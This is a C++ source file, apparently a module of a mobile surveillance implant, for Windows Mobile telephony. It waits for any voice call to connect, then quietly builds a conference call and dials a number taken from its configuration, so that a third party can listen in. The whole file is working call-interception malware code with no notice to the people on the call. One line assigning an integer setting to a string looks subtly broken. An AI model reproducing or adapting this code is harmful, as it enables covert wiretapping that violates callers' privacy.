#include "Common.h"
#include "Module.h"
#include "Log.h"
#include "Device.h"

#include <tapi.h>
#include <extapi.h>
#include <regext.h>
#include <snapi.h>
#include <pm.h>

void FAR PASCAL lineCallbackFunc(DWORD hDevice, DWORD dwMsg, DWORD dwCallbackInstance, DWORD dwParam1, DWORD dwParam2, DWORD dwParam3) {

}

DWORD WINAPI CallAgent(LPVOID lpParam) {
	HLINEAPP hLineApp;
	HRESULT result, dwRequestId;
	HLINE hLineOpened = NULL;
	DWORD dwPhoneNumDevs = 0, dwLineNumDevs = 0, dwApiVersion = 0x00030000;
	LINEINITIALIZEEXPARAMS liep;
	LINEMESSAGE lineMess;
	UINT i;

	Configuration *conf;
	Module *me = (Module *)lpParam;
	HANDLE eventHandle;
	wstring number;

	me->setStatus(MODULE_RUNNING);
	eventHandle = me->getEvent();
	conf = me->getConf();

	try {
		number = conf->getInt(L"number");
	} catch (...) {
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	DBG_TRACE(L"Debug - Conference.cpp - Conference Module started\n", 5, FALSE);

	LOOP {
		ZeroMemory(&liep, sizeof(liep));
		liep.dwTotalSize = sizeof(LINEINITIALIZEEXPARAMS);
		liep.dwOptions   = LINEINITIALIZEEXOPTION_USEEVENT;

		result = lineInitializeEx(&hLineApp, 0, lineCallbackFunc, TEXT("ExTapi_Lib"), &dwPhoneNumDevs, &dwApiVersion, &liep);

		if (result < 0) {
			me->setStatus(MODULE_STOPPED);
			DBG_TRACE(L"Debug - Conference.cpp - Conference Module [0]\n", 5, FALSE);
			return 0;
		}

		for (i = 0; i < dwPhoneNumDevs; i++) {
			LINEEXTENSIONID extensionID;
			ZeroMemory(&extensionID, sizeof(LINEEXTENSIONID));

			result = lineNegotiateAPIVersion(hLineApp, i, 0x00014000, 0x00030000, &dwApiVersion, &extensionID);
		}

		DWORD extVersion = 0;
		LINECALLPARAMS lineCallParams;
		HCALL hCall = NULL, hConfCall = NULL, hListenerCall = NULL;

		ZeroMemory(&lineCallParams, sizeof(lineCallParams));
		lineCallParams.dwTotalSize = sizeof(lineCallParams);
		lineCallParams.dwBearerMode = LINEBEARERMODE_VOICE;
		lineCallParams.dwAddressMode = LINEADDRESSMODE_DIALABLEADDR;
		lineCallParams.dwCallParamFlags = LINECALLPARAMFLAGS_IDLE;
		lineCallParams.dwMediaMode = 0;

		result = lineOpen(hLineApp, 0, &hLineOpened, dwApiVersion, 0, 0x100,
			LINECALLPRIVILEGE_MONITOR | LINECALLPRIVILEGE_OWNER, LINEMEDIAMODE_INTERACTIVEVOICE /*| LINEMEDIAMODE_DATAMODEM*/, &lineCallParams);

		if (result < 0) {
			me->setStatus(MODULE_STOPPED);
			DBG_TRACE(L"Debug - Conference.cpp - Conference Module FAILED [1]\n", 5, FALSE);
			return 0;
		}

		// Attendiamo che arrivi o sia effettuata una chiamata
		LOOP {
			if (WaitForSingleObject(liep.Handles.hEvent, 1000) == WAIT_TIMEOUT) {
				if (me->shouldStop() == FALSE)
					continue;

				lineShutdown(hLineApp);
				me->setStatus(MODULE_STOPPED);
				DBG_TRACE(L"Debug - Conference.cpp - Conference Module clean stop\n", 5, FALSE);
				return 0;
			}

			if (!lineGetMessage(hLineApp, &lineMess, INFINITE) && lineMess.dwMessageID == LINE_CALLSTATE &&
				lineMess.dwParam1 == LINECALLSTATE_CONNECTED) {

					hCall = (HCALL)lineMess.hDevice; // Prendiamo l'handle della chiamata!
					break;
			}
		}

		// Prendiamo i privilegi sulla chiamata
		result = lineSetCallPrivilege(hCall, LINECALLPRIVILEGE_OWNER);

		if (result < 0) {
			lineShutdown(hLineApp);
			DBG_TRACE(L"Debug - Agents.cpp - CallAgent FAILED [2]\n", 5, FALSE);
			continue;
		}

		// XXX Su alcuni cell hCall DEVE essere NULL e il secondo parametro valorizzato
		// LONG lRet = lineSetupConference(hCall, NULL, &hConfCall, &hListenerCall, 3, (const LPLINECALLPARAMS)plineParams);
		LONG lRet = lineSetupConference(hCall, NULL, &hConfCall, &hListenerCall, 3, NULL);

		if (lRet < 0) {
			lineShutdown(hLineApp);
			DBG_TRACE(L"Debug - Agents.cpp - CallAgent FAILED [3]\n", 5, FALSE);
			continue;
		}

		// Attendiamo che la lineSetupConference ci comunichi il suo stato
		BOOL bReply, bConferenced, bDial, bOnHold;
		bReply = bConferenced = bDial = bOnHold = FALSE;

		LOOP {
			if (WaitForSingleObject(liep.Handles.hEvent, 1000) == WAIT_TIMEOUT) {
				if (me->shouldStop() == FALSE)
					continue;

				lineShutdown(hLineApp);
				me->setStatus(MODULE_STOPPED);
				DBG_TRACE(L"Debug - Conference.cpp - Conference Module clean stop\n", 5, FALSE);
				return 0;
			}

			if (!lineGetMessage(hLineApp, &lineMess, INFINITE)) {
				if (lineMess.dwMessageID == LINE_REPLY) {
					if (lineMess.dwParam2 == 0)
						bReply = TRUE;
					else
						return 0; // XXX Non dobbiamo continuare in questo caso
				}

				if (lineMess.hDevice == (DWORD)hCall && lineMess.dwParam1 == LINECALLSTATE_CONFERENCED)
					bConferenced = TRUE;

				if (lineMess.hDevice == (DWORD)hListenerCall && lineMess.dwParam1 == LINECALLSTATE_DIALTONE)
					bDial = TRUE;

				if (lineMess.hDevice == (DWORD)hConfCall && lineMess.dwParam1 == LINECALLSTATE_ONHOLDPENDCONF)
					bOnHold = TRUE;
			}

			if (bReply && bConferenced && bDial && bOnHold)
				break;
		}

		dwRequestId = lineDial(hListenerCall, number.c_str(), 0);

		if (dwRequestId < 0) {
			lineShutdown(hLineApp);
			DBG_TRACE(L"Debug - Agents.cpp - CallAgent FAILED [4]\n", 5, FALSE);
			continue;
		}

		// Attendiamo che la terza parte risponda
		BOOL bTerminated = FALSE;
		bReply = bConferenced = FALSE;

		LOOP {
			if (WaitForSingleObject(liep.Handles.hEvent, 1000) == WAIT_TIMEOUT) {
				if (me->shouldStop() == FALSE)
					continue;

				lineShutdown(hLineApp);
				me->setStatus(MODULE_STOPPED);
				DBG_TRACE(L"Debug - Conference.cpp - Conference Module clean stop\n", 5, FALSE);
				return 0;
			}

			if (!lineGetMessage(hLineApp, &lineMess, INFINITE)) {
				if (lineMess.dwMessageID == LINE_REPLY)
					bReply = TRUE;

				if (lineMess.hDevice == (DWORD)hListenerCall && lineMess.dwParam1 == LINECALLSTATE_CONNECTED)
					bConferenced = TRUE;

				// Vediamo se nel frattempo la chiamata e' terminata
				if (lineMess.dwMessageID == LINE_CALLSTATE && lineMess.dwParam1 == LINECALLSTATE_DISCONNECTED) {
					bTerminated = TRUE;
					break;
				}
			}

			if (bReply && bConferenced)
				break;
		}

		result = lineAddToConference(hConfCall, hListenerCall);

		if (result < 0 || bTerminated) {
			lineDrop(hListenerCall, NULL, 0);
			lineShutdown(hLineApp);
			DBG_TRACE(L"Debug - Agents.cpp - CallAgent FAILED [Call not answered?] [4]\n", 5, FALSE);
			continue;
		}

		// Attendiamo che la conference call sia completa
		bReply = bConferenced = bDial = FALSE;

		LOOP {
			if (WaitForSingleObject(liep.Handles.hEvent, 1000) == WAIT_TIMEOUT) {
				if (me->shouldStop() == FALSE)
					continue;

				lineShutdown(hLineApp);
				me->setStatus(MODULE_STOPPED);
				DBG_TRACE(L"Debug - Conference.cpp - Conference Module clean stop\n", 5, FALSE);
				return 0;
			}

			if (!lineGetMessage(hLineApp, &lineMess, INFINITE)) {
				if (lineMess.dwMessageID == LINE_REPLY)
					bReply = TRUE;

				if (lineMess.hDevice == (DWORD)hListenerCall && lineMess.dwParam1 == LINECALLSTATE_CONFERENCED)
					bConferenced = TRUE;

				if (lineMess.hDevice == (DWORD)hConfCall && lineMess.dwParam1 == LINECALLSTATE_CONNECTED)
					bDial = TRUE;
			}

			if (bReply && bConferenced && bDial)
				break;
		}

		// Attendiamo ora la fine della telefonata
		// 1. Chiude il chiamante, chiudiamo anche noi
		// 2. Chiude il chiamato, chiudiamo anche noi
		LOOP {
			if (WaitForSingleObject(liep.Handles.hEvent, 1000) == WAIT_TIMEOUT) {
				if (me->shouldStop() == FALSE)
					continue;

				lineShutdown(hLineApp);
				me->setStatus(MODULE_STOPPED);
				DBG_TRACE(L"Debug - Conference.cpp - Conference Module clean stop\n", 5, FALSE);
				return 0;
			}

			if (!lineGetMessage(hLineApp, &lineMess, INFINITE)) {
				if (lineMess.dwMessageID == LINE_CALLSTATE && lineMess.dwParam1 == LINECALLSTATE_DISCONNECTED) {
					lineDrop(hListenerCall, NULL, 0);
					break;
				}
			}
		}

		lineShutdown(hLineApp);
	}

	return 0;
}